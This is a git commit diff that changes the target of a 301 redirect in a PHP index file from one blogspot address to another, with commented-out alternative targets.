e4b9399cef6a0b4608ddfbc38f5e87ac6f0cc412
argeni5959 <67845811+argeni5959@users.noreply.github.com>
2020-09-12 02:20:18 -0400

    Update index.php

--- supermosterin/friaslesteriani/index.php
+++ supermosterin/friaslesteriani/index.php
@@ -7,7 +7,7 @@ Header( "HTTP/1.1 301 Moved Permanently" );
 
 //Header( "Location: https://drive.google.com/file/d/1xYaLKH_kvUdi4nryRySO9s7kqmt2ZLFk/view");
 
-Header( "Location: https://elirialistermaterialisasa.blogspot.com/");
+Header( "Location: https://monteliante-porialeisa.blogspot.com/");
 
 //Header( "Location: https://google.com");
 
